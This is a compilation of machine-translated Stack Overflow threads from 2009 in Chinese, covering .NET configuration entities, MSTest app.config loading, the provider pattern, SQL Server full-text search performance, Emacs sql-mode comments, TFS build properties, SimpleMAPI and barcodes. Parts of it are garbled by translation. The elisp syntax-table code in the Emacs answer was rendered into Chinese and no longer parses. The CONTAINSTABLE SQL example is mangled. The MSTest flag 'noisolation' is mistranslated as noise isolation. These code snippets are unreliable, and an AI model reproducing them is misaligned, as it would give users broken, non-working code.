> 时间：2009-01-27T19:15:04.580
> 
> 标签：.net, entity, config

我正在尝试在配置文件中使用实体定义来简化开发、QA、UAT 和生产版本之间的差异。这是我的配置文件开头的示例：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE configuration [
    <!ENTITY MyStorageLocation "\\MyServer\MyStorageFolder">
    <!ENTITY MyDatabaseServer "devdb01">
]>
<configuration>
    <configSections>
    <section name="MyCustomSection" type="MyCustomSectionHandler,MyAssembly"/>
        ...
    </configSections>
<connectionStrings>
    <add name="MyConnectionString" providerName="System.Data.SqlClient" connectionString="Server=&MyDatabaseServer;;Database=MyDatabase;"/>
</connectionStrings>
    ...
<MyCustomSection>&MyStorageLocation;</MyCustomSection>
</configuration> 
```

这似乎工作正常，为什么不是因为它是完全有效的 XML，只要我不在最终调用 ConfigurationManager.GetSection() 的自定义配置部分中使用任何这些实体。在连接字符串中使用“MyDatabaseServer”实体不会导致任何问题。在提供的示例中，只要我不在 MyCustomSection 元素中使用“MyStorageLocation”实体，一切都会正常工作，然后我只在调用 ConfigurationManager.GetSection() 请求自定义部分时遇到错误。

我最好的猜测是 ConfigurationManager 类正在获取元素的原始源并尝试将其加载为 XML，忽略整个 XML 文件的声明实体。有没有更好的方法来做到这一点，而不是重新编码自定义配置部分以支持对设置的引用而不是许多绝对设置？

我收到的错误是：

```
2009-01-27 14:00:53,474 [11936] ERROR MyCustomWindowsService [(null)] - Errors starting service -- shutting down
System.Configuration.ConfigurationErrorsException: Reference to undeclared entity 'MyStorageLocation'. Line 183, position 19\. (D:\...\MyCustomWindowsService.exe.config line 183) ---> System.Xml.XmlException: Reference to undeclared entity 'MyStorageLocation'. Line 183, position 19.
   at System.Xml.XmlTextReaderImpl.Throw(Exception e)
   at System.Xml.XmlTextReaderImpl.HandleGeneralEntityReference(String name, Boolean isInAttributeValue, Boolean pushFakeEntityIfNullResolver, Int32 entityStartLinePos)
   at System.Xml.XmlTextReaderImpl.ResolveEntity()
   at System.Xml.XmlTextReader.ResolveEntity()
   at System.Xml.XmlLoader.LoadEntityReferenceNode(Boolean direct)
   at System.Xml.XmlLoader.LoadNode(Boolean skipOverWhitespace)
   at System.Xml.XmlLoader.LoadDocSequence(XmlDocument parentDoc)
   at System.Xml.XmlLoader.Load(XmlDocument doc, XmlReader reader, Boolean preserveWhitespace)
   at System.Xml.XmlDocument.Load(XmlReader reader)
   at System.Configuration.ErrorInfoXmlDocument.LoadFromConfigXmlReader(ConfigXmlReader reader)
   at System.Configuration.RuntimeConfigurationRecord.RuntimeConfigurationFactory.CreateSectionImpl(RuntimeConfigurationRecord configRecord, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentConfig, ConfigXmlReader reader)
   at System.Configuration.RuntimeConfigurationRecord.RuntimeConfigurationFactory.CreateSectionWithRestrictedPermissions(RuntimeConfigurationRecord configRecord, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentConfig, ConfigXmlReader reader)
   at System.Configuration.RuntimeConfigurationRecord.CreateSection(Boolean inputIsTrusted, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentConfig, ConfigXmlReader reader)
   at System.Configuration.BaseConfigurationRecord.CallCreateSection(Boolean inputIsTrusted, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentConfig, ConfigXmlReader reader, String filename, Int32 line)
   --- End of inner exception stack trace ---
   at System.Configuration.BaseConfigurationRecord.EvaluateOne(String[] keys, SectionInput input, Boolean isTrusted, FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentResult)
   at System.Configuration.BaseConfigurationRecord.Evaluate(FactoryRecord factoryRecord, SectionRecord sectionRecord, Object parentResult, Boolean getLkg, Boolean getRuntimeObject, Object& result, Object& resultRuntimeObject)
   at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject)
   at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject)
   at System.Configuration.BaseConfigurationRecord.GetSectionRecursive(String configKey, Boolean getLkg, Boolean checkPermission, Boolean getRuntimeObject, Boolean requestIsHere, Object& result, Object& resultRuntimeObject)
   at System.Configuration.BaseConfigurationRecord.GetSection(String configKey, Boolean getLkg, Boolean checkPermission)
   at System.Configuration.BaseConfigurationRecord.GetSection(String configKey)
   at System.Configuration.ClientConfigurationSystem.System.Configuration.Internal.IInternalConfigSystem.GetSection(String sectionName)
   at System.Configuration.ConfigurationManager.GetSection(String sectionName)
   at MyCustomWindowsService.Monitor() in D:\...\MyCustomWindowsService.cs:line 207
   at MyCustomWindowsService.Start() in D:\...\MyCustomWindowsService.cs:line 178 
```

在 ConfigurationManager 的深处......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-09T09:18:42.567

也许您的 XML 处理器忽略了 !ENTITY 声明，因为它们包含在原本为空的 DTD 中。

您是否有可用于验证此文档的 DTD？缺少 DTD 或模式，您不能真正说该文档是有效的。尝试通过在线 XML 验证服务运行它，例如 URL：[http ://www.validome.org/xml/validate/](http://www.validome.org/xml/validate/ "XML 验证器")

这是您的文档的修订版本，其中包含我制作的 DTD。看看这是否有帮助。

* * *

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE configuration [
    <!ELEMENT configuration (configSections+, connectionStrings+, MyCustomSection)>

    <!ELEMENT configSections (section+)>

    <!ELEMENT section EMPTY>
    <!ATTLIST section name CDATA #REQUIRED>
    <!ATTLIST section type CDATA #REQUIRED>

    <!ELEMENT connectionStrings (add+)>

    <!ELEMENT add EMPTY>
    <!ATTLIST add name CDATA #REQUIRED>
    <!ATTLIST add providerName CDATA #REQUIRED>
    <!ATTLIST add connectionString CDATA #REQUIRED>

    <!ELEMENT MyCustomSection (#PCDATA)>

    <!ENTITY MyStorageLocation "\\MyServer\MyStorageFolder">
    <!ENTITY MyDatabaseServer "devdb01">
]>
<configuration>
  <configSections>
    <section name="MyCustomSection" type="MyCustomSectionHandler,MyAssembly"/>
  </configSections>
  <connectionStrings>
    <add name="MyConnectionString" providerName="System.Data.SqlClient" connectionString="Server=&MyDatabaseServer;;Database=MyDatabase;"/>
  </connectionStrings>
  <MyCustomSection>&MyStorageLocation;</MyCustomSection>
</configuration> 
```

# .net - MSTest.exe 找不到 app.config

> ID：484800
> 
> 赞同：22
> 
> 时间：2009-01-27T19:15:11.753
> 
> 标签：.net, visual-studio-2008, app-config, mstest

我目前正在尝试从 NCover 运行 MSTest.exe，但我相信这个问题通常适用于从命令行运行 MSTest.exe。

如果我有“/noisolation”参数，那么 MSTest.exe 似乎会按预期找到并使用 app.config。没有它，NCover 不会捕获任何覆盖信息。从我目前的研究来看，似乎 NCover 需要 /noisolation。所以问题是如何让我的 *.config 文件在传递该参数时工作。

我的 NCover 设置是：

**应用程序配置文件**
C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\MSTest.exe

**工作文件夹**
C:\Documents and Settings\MyProfile\My Documents\Visual Studio 2008\Projects\XYZ\XYZ.CoreTest\bin\Debug

**应用程序参数**
/noisolation /testcontainer:"C:\Documents and Settings\MyProfile\My Documents\Visual Studio 2008\Projects\XYZ\XYZ.CoreTest\bin\Debug\XYZ.CoreTest.dll"

更新：我添加了一条跟踪信息，表明我的配置（毫不奇怪）试图从“C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\MSTest.exe.Config”中读取。

更新 2：如果可能的话，我不想编辑 MSTest.exe.Config。那只是不是非常便携。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2010-08-06T14:09:15.790

来自 Craig Stuntz 在[链接文本的评论中](http://devlicio.us/blogs/derik_whittaker/archive/2008/07/23/mstest-why-i-hate-you-you-cause-me-too-much-friction.aspx)

如何使用 MSTest 做到这一点。

1.  在解决方案资源管理器中，右键单击解决方案（不是项目）。

2.  点击添加，新建项目

3.  在类别中，选择测试运行配置

4.  现在选择测试运行配置项并将其添加到您的项目中

5.  在解决方案资源管理器中，双击刚刚创建的测试运行配置

6.  单击部署项

7.  将您的配置文件添加为已部署的文件（或部署包含它的整个文件夹，如果合适的话）

我花了一点时间才弄清楚，但我处于类似的情况，它确实对我有用。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-29T20:09:11.810

在 Visual Studio 中，将 App.config 文件标记为 CopyAlways 的属性。（右键单击文件，选择属性进入属性面板）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-30T04:41:14.447

在[http://docs.ncover.com/ref/2-0/whats-new-in-ncover-2-0/release-notes-for-ncover-2-1-0/](http://docs.ncover.com/ref/2-0/whats-new-in-ncover-2-0/release-notes-for-ncover-2-1-0/)在 NCover 修复下：

*在 MSTest 上运行覆盖不再需要“/noisolation”标志。NCover 正确收集覆盖范围*

如果确实解决了这个问题，则将 NCover 升级到 2.1.0。也许这会奏效。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-10-01T10:43:21.020

我在使用[MSTestRunner Plugin](https://wiki.jenkins-ci.org/display/JENKINS/MSTestRunner+Plugin)构建 Jenkins 时遇到了同样的问题。从配置页面检查省略 NoIsolation 解决了该问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-30T01:28:49.887

有一种技术可以组合配置文件的内容，[这里](https://stackoverflow.com/questions/89245/how-do-you-manage-net-appconfig-files-for-large-applications)有详细介绍。您可以将固定文件 inlcude 行添加到 MSTest.exe.Config，然后将应用的 app.config 复制到该固定文件位置。它很丑陋，但比针对每种不同的可能性破解 MSTest.exe.Config 更便携。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-29T23:42:16.890

我以前从未使用过 NoIsolation，但如果我理解正确，它会在 MSTest 类中运行您的所有测试代码。既然如此，它确实并且应该读取 MSTest 的应用程序配置。如果您坚持使用噪声隔离，我认为您必须将 App.config 合并到 MSTest.exe.config 中。当然，这是一个黑客。

完全避免噪音隔离可能会更好。如果是由于错误，请尽可能修复错误。如果无法重新组织（主要重构）您的应用程序，请解决该错误。我不确定是否有*优雅*的选择。

我发现“*我认为我们需要找到此问题的根本原因以避免噪声隔离开关。您可能需要修改您的应用程序。是否可以创建一个简单的解决方案来重现相同的问题？* ”在[此 URL](http://social.msdn.microsoft.com/Forums/en-US/vststest/thread/a15f8a4b-b869-4a35-ac72-57f783bdd7b7/)。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-14T06:48:32.787

为了消除混淆：不使用 /noisolation = 如果找到 SameNameAsYourDll.dll.config 文件，它将自动与测试 dll 一起部署，并将用于运行测试的应用程序域的应用程序配置那个大会

using /noisolation = 我们在测试、您、主机进程和其他一切之间所做的所有隔离都在窗外。我们可能仍会进行一些隔离，但您不会获得应用程序域对您的测试 dll 唯一的额外好处。因此，您的 dll 配置将无济于事。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-08-22T09:18:17.720

尝试将其名称从更改`app.config`为`projectname.extension.**config**`

例如，如果您有一个名为的单元测试项目`proj1`并使用它`dll`，请重命名`app.config`为 `proj1.dll.config`

这对我有用。

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2009-01-30T04:55:38.177

好的，我冒着我的帖子会演变成单元测试的风险，但我认为问题在于您的测试，甚至可能是您的代码。你应该重构。

单元测试应该是原子的。单个测试不应该有外部依赖，而配置文件**就是**这样的依赖。没有测试应该依赖于配置文件。

如果您正在测试使用来自配置文件的信息的方法，请重构您的代码，以便在方法外部读取配置的信息，并在调用方法之前将其传递给方法或设置为属性。这样，您的测试可以将值传递给方法，或者在测试设置期间设置属性。

如果您需要 app.config 作为数据库连接字符串，则只能靠自己。众所周知，DAL 难以进行单元测试。如果它用于 Web 服务连接字符串，请不要使用它——模拟接口。

# design-patterns - 需要提供者模式的替代方案

> ID：484815
> 
> 赞同：1
> 
> 时间：2009-01-27T19:18:35.210
> 
> 标签：design-patterns, provider

我正在维护一个 Web 应用程序，该应用程序使用如下所述的提供者模式，用于配置目的。

[http://msdn.microsoft.com/en-us/library/ms972319.aspx](http://msdn.microsoft.com/en-us/library/ms972319.aspx)
[http://msdn.microsoft.com/en-us/library/ms972370.aspx](http://msdn.microsoft.com/en-us/library/ms972370.aspx)

一切都运行良好，但是当我们向应用程序添加功能时，我们发现我们的提供程序已成为几个不属于一起的不同功能的混搭。我们正在考虑拆分配置提供程序，以便将类似的功能与其他类似的功能组织在一起。我们这样做是因为我们的原始提供程序现在有一些不需要由某些模块实现的功能。在实现提供程序时，我们不想仅仅在无关的函数上抛出 NotImplementedException，而是根本不包括它们。

我们意识到我们可以使用上述 MSDN 方法创建多个提供程序，但多个提供程序只会在 web.config 中创建更多条目。尽量减少 web.config 中的条目会很好，因为它开始变大了。

有没有人找到另一种实现提供者模型的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-28T02:06:26.167

您可以查看使用控制反转 (IoC) 容器（Google“Castle Windsor”、StructureMap、AutoFac、NInject 或 Microsoft Unity）。使用 IoC，您可以在配置文件中或在应用程序的开头配置“提供程序”。

通常，您将为您拥有的每种类型的提供者创建接口。使用接口，您可以轻松地分解您的提供者，但这对您来说是有意义的。

一旦你有了接口，你可以在需要时简单地向容器询问该接口的实现，容器将负责为你实例化一个提供程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-30T19:06:11.880

看看这里： http: [//geekswithblogs.net/joycsharp/archive/2009/04/10/aggregator-provider-pattern-an-extension-of-provider-pattern.aspx](http://geekswithblogs.net/joycsharp/archive/2009/04/10/aggregator-provider-pattern-an-extension-of-provider-pattern.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-12-13T11:03:50.130

我相信您基本上可以使用任何允许配置的 IOC（其中大多数）来做到这一点。

我要做的方式是在代码中配置 AutoFac 以使用“已知”实现，但允许可选的“配置覆盖”。因此，如果我们曾经“转售”一个应用程序并且有人需要不同的实现，他们可以配置它。

在我的博客文章中阅读更多内容 - 希望该博客也会得到一些好的评论：[http ://healthedev.blogspot.com/2011/12/making-custom-built-applications.html](http://healthedev.blogspot.com/2011/12/making-custom-built-applications.html)

# sql-server - 添加许多记录后的 SQL Server FTS 性能

> ID：484821
> 
> 赞同：4
> 
> 时间：2009-01-27T19:20:08.017
> 
> 标签：sql-server, performance, full-text-search

我们有一个 Web 应用程序，允许客户管理大量名称列表。为了在这些列表中进行搜索，我们使用 SQL Server 2008 的 FTS，它通常运行良好。我们最大的客户拥有 900,000 个姓名，并享有亚秒级的搜索时间。

然而，对于另一个新客户端，我最近导入了 150,000 个名称，性能很糟糕（例如，服务器非常糟糕）。我检查了全文索引器，它声称最近完成了一次爬网。

查看执行计划，我注意到在快速情况下（对于较大的客户端），SQL Server 首先执行 FTS，然后对结果执行索引搜索。对于较新的客户端，它首先进行索引搜索（显然，对于新记录，150,000 次），然后进行 FTS。

所以我尝试了 WITH(INDEX(MyFullTextIndex)) 提示，但 SQL Server 说索引不存在。显然，它不认为这些 FTS 索引是“真正的”索引。如何强制 SQL Server 始终首先使用 FTS？

更新：我尝试重新生成统计信息，但无济于事。同样的性能问题。

以下是执行计划：

快速性能： http: [//frameaction.com/LLExecutionPlan01.sqlplan](http://frameaction.com/LLExecutionPlan01.sqlplan)

性能缓慢：http: [//frameaction.com/LLExecutionPlan18.sqlplan](http://frameaction.com/LLExecutionPlan18.sqlplan)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-29T00:22:40.557

我尝试在查询末尾添加“优化未知值”提示（我还必须在查询中添加一个虚拟变量以在提示中引用一些内容）。到目前为止，它似乎运行良好。我对添加提示有点紧张，所以我仍在寻找更好的解决方案，但现在这正在工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-03T04:06:36.993

我从来没有使用过 SQL Server 的 FTS 服务，但是就像第一个发帖人所说的那样，我发现在加载数据仓库或报告数据库时，某些运行良好的查询在加载大量数据后运行速度非常慢。在每次加载后运行 sp_updatestats 解决了问题（即使选中了自动更新统计信息数据库选项（默认情况下）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-28T01:07:49.810

不确定这会有所帮助，但您可以尝试使用 CONTAINSTABLE - 它可以让您更改加入顺序。

> **SELECT** customer_id **FROM** customers **WHERE** **CONTAINS** (customername, 'Foobar')

变成

> ****从** 客户中**选择** customer_id**作为 FTTABLE** **INNER** **JOIN** **CONTAINSTABLE**（客户，客户名称，'Foobar'）FTINDEX **ON** FTINDEX.[Key] = FTTABLE.customer_id**

 *** * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T21:13:11.627

检查每个表的统计信息。两台服务器可能有不同的统计数据集，因为 SQL 会根据您的设置自动生成统计数据。如果它创建了不同的统计信息，它将为查询选择不同的查询计划。

然后，确保您的统计信息已更新。在线图书中提供了有关更新每个表的统计信息的信息：

[http://msdn.microsoft.com/en-us/library/ms187348.aspx](http://msdn.microsoft.com/en-us/library/ms187348.aspx)

我会使用全扫描进行更新，以确保您获得良好的数据。

最后，如果这些都不起作用，请在 SQL Server Management Studio 中运行查询，但使用“包含实际查询计划”选项。然后右键单击查询计划上的任意位置并选择另存为 XML。将这两个不同的查询计划发布在网络上的某个地方，我们将看看有什么区别以及原因。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-26T13:47:25.400

FTS 索引是一个黑盒，sql server 只能将其结果集加入其中，它总是搜索整个表，而不管任何 where 子句或内部连接。我发现提高 FT 搜索性能的一种方法是在模式绑定视图中执行连接和任何基于 where 子句的非参数，并在该视图上搜索全文索引。

# sql - 如何让 Emacs sql-mode 识别 MySQL #-style 注释？

> ID：484826
> 
> 赞同：3
> 
> 时间：2009-01-27T19:21:08.030
> 
> 标签：sql, emacs, comments, elisp, sql-mode

我正在阅读一堆使用 # （到行尾）注释的 MySQL 文件，但我的 sql-mode 不支持它们。我找到了定义 /**/ 和 -- 注释的 sql.el 的语法表部分，但据此[，](http://www.zvon.org/other/elisp/Output/SEC561.html) Emacs 语法表仅支持 2 种注释样式。

有没有办法在 sql.el 中轻松添加对 # 注释的支持？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-11-20T19:37:19.340

Emacs-24 sql.el 内置了这个！只需运行`M-x sql-set-product MySQL RET`，语法表就会自动设置，所有其他保留字和类型的字体锁定关键字、交互模式等也是如此。太棒了！

如果您`SQL`在菜单栏中查看，您可以使用`Product`子菜单进行选择`MySQL`。

您还`M-x customize-variable sql-product RET`可以将默认产品设置为远离 ANSI。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2010-04-04T12:35:30.023

罗尔夫的回答似乎对我不起作用。AFAIK，用于开始评论的字符类，替代评论风格应该是“< b”，而不是“b”。这是我使用的：

```
 (add-hook 'sql-mode-hook 'my-sql-mode-hook) 
    (defun my-sql-mode-hook ()   
      ;; Make # start a new line comment in SQL. This is MySQL-specific
      ;; syntax.
      (modify-syntax-entry ?# "< b" sql-mode-syntax-table)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T21:04:41.503

您可以定义 ?# 来启动注释样式 b，这意味着有两种方式来启动替代注释样式（ -- 或 #）：

```
(setq sql-mode-syntax-table
  (let ((table (make-syntax-table)))
    ;; C 风格的注释 /**/（参见 elisp 手册“语法标志”））
    （修改语法条目？/“.14”表）
    （修改语法条目？*“。23”表）
    ;; 双破折号开始评论
    （修改语法条目？-“.12b”表）
    （修改语法条目？#“b”表）
    （修改语法条目 ?\f "> b" 表）
    ;; 单引号 (') 分隔字符串
    （修改语法条目？' "\"" 表）
    ;; 双引号 (") 不分隔字符串
    （修改语法条目？\" "." 表）
    ;; 反斜杠不是转义字符
    （修改语法条目？\\“。”表）
    桌子））

```

（这是从 sql.el 复制并修改的，这意味着这是 GPL）

# .net - Team Foundation Server 构建变量

> ID：484832
> 
> 赞同：13
> 
> 时间：2009-01-27T19:22:31.740
> 
> 标签：.net, tfs, build-automation

有谁知道（或知道在哪里可以找到，我自己不知道）我可以在 TFSBuild.proj 文件上使用哪些变量来进行自动构建？

例如，$(SolutionRoot) 为我提供了所有源文件的路径，但我想从发布目录复制构建的解决方案（即：\Nightly Build20090127.7\Release\_PublishedWebsites）并且我找不到哪个变量会给我那个目录。

总而言之，我想知道自动构建的发布目录的变量，但也希望列出我可以使用的其他变量（我使用的是 tfs 2008）

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-01-27T20:08:50.850

看看我不久前在试图弄清楚这一切时所做的一篇博客文章：

[30 个有用的团队建设属性](http://www.woodwardweb.com/vsts/30_useful_team.html)

此外，Aaron Hallberg（TFS 构建团队的负责人）也记录了大量属性 - 不仅是值，还有可扩展性属性（即您可以设置为某些值来控制构建过程的属性），这是一个很好的参考：

[Team Build 2008 属性参考](http://blogs.msdn.com/aaronhallberg/archive/2008/02/12/team-build-2008-property-reference.aspx)

我认为您可能需要的属性是 $(BinariesRoot) 但我不确定（我目前倾向于构建类库而不是 ASP.NET 站点，因此没有方便参考的构建）。

希望有帮助，

马丁。

# c++ - C++ SimpleMAPI SendMail 总是失败？

> ID：484834
> 
> 赞同：3
> 
> 时间：2009-01-27T19:22:37.700
> 
> 标签：c++, email, mapisendmail

我正在尝试使用[SimpleMAPI](http://msdn.microsoft.com/en-us/library/dd296734(VS.85).aspx)在 C++ 应用程序（Borland C++ Builder 2006）中使用 Windows Mail 或 Thunderbird 在 Vista SP1 上显示带有附件的“写消息”对话框。我应该能够使用[MAPISendMail](http://msdn.microsoft.com/en-us/library/dd296721(VS.85).aspx)来执行此操作。

我没有填写收件人地址，因为我希望用户在邮件客户端显示“写消息”对话框时这样做。我也没有填写发起人地址，因为我希望邮件客户端使用默认值。我已经尝试对它们进行硬编码，看看是否是问题所在，而事实并非如此。

我的代码如下所示：

```
HINSTANCE hMAPI;
LPMAPISENDMAIL pSendMail;
MapiMessage message;
MapiFileDesc file;

ZeroMemory( &message, sizeof( MapiMessage ) );
ZeroMemory( &file, sizeof( MapiFileDesc ) );

hMAPI = LoadLibraryA( "MAPI32.DLL" );

pSendMail = (LPMAPISENDMAIL)GetProcAddress( hMAPI, "MAPISendMail" );

// setup the attachment...
file.nPosition     = -1;
file.lpszPathName  = "C:\\my_attachment.dat";

// set up the message...
message.lpszSubject     = "My Subject";
message.lpszNoteText    = "My Message...";
message.lpszMessageType = "";
message.nRecipCount     = 0;
message.lpRecips        = NULL; // we don't know the recipient address(s)
message.nFileCount      = 1;
message.lpFiles         = &file;
message.lpOriginator    = NULL; // we don't know the users from address

dwResult = pSendMail( lhSessionNull, (DWORD)Application->Handle, &message, MAPI_LOGON_UI | MAPI_DIALOG, 0 );
if( dwResult == SUCCESS_SUCCESS )
{ 
  // ...yay! :)
}
else
{
  // ...we always fail here with: MAPI_E_FAILURE
} 
```

它总是以错误代码 2 (MAPI_E_FAILURE) 失败。我究竟做错了什么？

提前谢谢了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-29T11:31:16.070

This might interest you:

[http://groups.google.com/group/microsoft.public.win32.programmer.messaging/browse_thread/thread/a601e68b95f20609/f0b0d80c99d4eba7?lnk=gst&q=Vista+Outlook+2007#f0b0d80c99d4eba7](http://groups.google.com/group/microsoft.public.win32.programmer.messaging/browse_thread/thread/a601e68b95f20609/f0b0d80c99d4eba7?lnk=gst&q=Vista+Outlook+2007#f0b0d80c99d4eba7)

Have you tried the code with your email client closed?

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-11-12T17:49:07.230

在 Delphi 中使用类似并发现它在线程内部不起作用。（Delphi TThread 组件）我使用了完全相同的代码，并且从线程内调用总是失败，即使我使用了同步

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-10-12T14:01:45.427

> 消息.lpRecips = NULL；// 我们不知道收件人地址

尝试分配 lpRecips 并将其 lpszAddress 设置为“SMTP：”

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2009-01-27T19:50:09.063

您必须先登录到 MAPI 会话

```
LHANDLE hMapiSession;
status = lpMapiLogon(NULL, NULL, NULL, MAPI_NEW_SESSION | MAPI_LOGON_UI, 0, &hMapiSession); 
```

然后，您可以调用 SendMail()。之后，您必须再次注销：

```
lpMapiLogoff(hMapiSession, NULL, 0, 0); 
```

# iphone - 如何使用 iPhone SDK 获取视图上的控件列表？

> ID：484839
> 
> 赞同：1
> 
> 时间：2009-01-27T19:23:57.103
> 
> 标签：iphone, objective-c

我想在填写表格时执行类似 safari 应用程序的操作，因此当用户看到键盘执行下一步并移至下一个控件时。

现在，我如何获得下一个文本控件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T19:35:44.460

您可以在**textFieldShouldReturn 中处理这样的行为：** 这应该会在每次用户点击返回时为您移动您的焦点。

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
    if(textField == field1) {
        [field1 resignFirstResponder];   
        [field2 becomeFirstResponder];    
        // do stuff with field1 text
    } else if(textField == field2) {
        [field2 resignFirstResponder];   
        [field3 becomeFirstResponder];
        // do stuff with field2 text
    } // and so on

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T19:48:13.887

您必须通过添加带有您自己的下一个/上一个按钮的子视图并将其定位在键盘的顶部边缘来滚动您自己。

# barcode - 条形码编程入门有什么好的资源吗？

> ID：484841
> 
> 赞同：20
> 
> 时间：2009-01-27T19:24:50.097
> 
> 标签：barcode

我希望能够将产品信息存储在 Web 应用程序的数据库中，我认为最好使用条形码作为产品标识符。现在我只想能够将代码的数字表示形式存储在数据库中，所以我需要找出最大长度、格式等......

最终我希望能够将它与条形码阅读器集成。

有没有什么好的资源可以帮助某人开始使用条形码编程？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-01-27T20:10:59.147

基于一些条码项目，这里有一个快速的总结。

1.  您的应用程序不需要知道或做任何不同的事情，因为您使用的是条形码。它们只是可能以其他方式打印的数据的表示。符号系统和维度可以在您需要时放在一起的封装抽象层中处理。

2.  符号系统一般由现货需求确定，如客户标准、行业标准等。如果是内部使用，一般认为 Code 39 是一个很好的默认值。

3.  对于打印，可以使用激光打印机、特殊标签纸和可下载字体来满足大多数要求。还可以从许多来源获得专用打印机，包括 Zebra、Intermec 等；但是这些更昂贵，您需要注意要打印的专有（阅读：昂贵）纸张。

4.  字体。Google 通常用于“条形码字体”，但一个方便的替代方案是这个[Postscript 条形码生成器](http://www.terryburton.co.uk/barcodewriter/)，它将在大多数 Postscript 打印机上打印几乎任何尺寸的任何符号系统。

5.  读取条形码。对于使用 PC 输入设备读取条形码，通常这是通过设备驱动程序实现的，提供您正常的打开/关闭/读取/写入/ioctl 等效项，或者作为与实际键盘内联的代理键盘，因此输入显示为击键（可选带有终端换行符。）非PC设备显然有自己的编程要求。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-27T20:40:28.917

我已经完成了大量的条形码工作。

您必须熟悉两个方面。

**生成/打印条形码**

这将涉及使用特定类型的条形码格式。对于大多数格式而言，Code 128 通常是最常见、最容易阅读的，并且可以打印最小的条形码。要打印 Code 128 格式的条形码，您需要字体、可以购买的库（idautomation 等）等，您将集成到您的软件中以打印条形码。Code 39 也很常见（通常是免费的）。它会打印非常宽的条形码，但随着您要条形码化的数据变得更大。

如果您要打印带有条形码的标签，您可能需要查看 Zebra 打印机。他们有一个优秀的内置编程语言 (ZPL)，可以让您本地生成所有类型的条形码——无需购买字体或库。

这里要考虑的重要一点是条形码的可读性。您会发现条形码像字体一样按比例缩放。确保您的条形码可以打印在您的介质上并且可以扫描（不会起皱、折叠或剥落等），这一点非常重要。

**阅读/使用条形码**

阅读条形码将从某种扫描仪开始。您可以获得能够读取任何类型条码并将解码的条码作为输入传输的条码。因此，如果您在屏幕上选择了一个字段，并扫描了某些内容，则条形码的内容将为您输入到该字段中。

您可以做的另一件事是购买运行 palm OS 或 windows ce/mobile 的移动扫描仪，例如由 symbol、psion teklogix 等制造的扫描仪。这些可以设置为运行用于接收、运输系统的集成软件，该软件将驱动你的工作流程。

通过不重新发明轮子，我发现生活变得轻松多了。我已经使用了上面提到的所有产品，发现它们集成得很好。也有一些很棒的 java 条形码库是免费的，我相信你也会找到一些适用于 .NET 的东西。如果您还有其他问题，请告诉我。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-27T19:41:26.210

我做过一些使用条形码扫描仪的应用程序，其中大多数不需要任何特殊编程。输入通常看起来与来自键盘的程序完全一样。因此，只需构建您的数据输入表单以接受存储在条形码中的数字等价物，对于大多数扫描仪来说，您就可以了。支持比您最初想象的要容易得多。

另一方面，打印条码稍微复杂一些，通常需要特殊的工具包。有可用的免费字体，但根据您编码的内容，结果可能会受到影响。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T20:09:58.757

如果您使用便宜的条形码阅读器，请使用[Code128](http://en.wikipedia.org/wiki/Code_128)。它可以对几乎任意长度的数字和/或文本进行编码（仅数字内容在 50% 小条形码中）。

如果您想使用相机/手机进行条形码解码，请使用[datamatrix](http://en.wikipedia.org/wiki/Datamatrix)。您可以将大约 1kb 的数据放入数据矩阵条码中。（编辑 2015：二维码似乎会慢慢杀死数据矩阵。所以选择二维码而不是数据矩阵。）

Wikipedia 对[条码](http://en.wikipedia.org/wiki/Barcode)的主题有很好的报道。

无耻插件：如果您对条形码的编码和解码方式感兴趣，您可能想看看免费的 Python 库[huBarcode](https://cybernetics.hudora.biz/projects/wiki/huBarcode)，它在纯 Python 中实现了最常见的条形码方案。由我公司出版。

